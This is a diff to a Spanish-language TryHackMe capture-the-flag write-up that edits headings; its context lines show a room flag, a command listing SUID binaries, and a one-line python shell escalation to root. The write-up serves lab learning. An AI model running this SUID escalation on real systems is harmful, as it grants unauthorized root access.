@@ -60,8 +60,8 @@ How likely are you to recommend this room to others?
 
 
 
-
-Notas:
+#Apuntes
+ 
 ### Escaneo de puertos
 
 ```shell
@@ -134,7 +134,7 @@ Una vez estando dentro de `www-data` vamos a /www/ donde estara la primera flag.
 THM{y0u_g0t_a_sh3ll}
 ```
 
-Si hacemos el siguiente comando para ver los permisos `SUID` que tenemos...
+vemos  los permisos `SUID` disponibles...
 
 ```shell
 find / -type f -perm -4000 -ls 2>/dev/null
@@ -146,7 +146,7 @@ Vemos que podemos ejecutar `python` como si fuera `root`...
 266770   3580 -rwsr-sr-x   1 root     root        3665768 Aug  4  2020 /usr/bin/python
 ```
 
-Por lo que haremos lo siguiente...
+elevación de privilegios
 
 ```shell
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
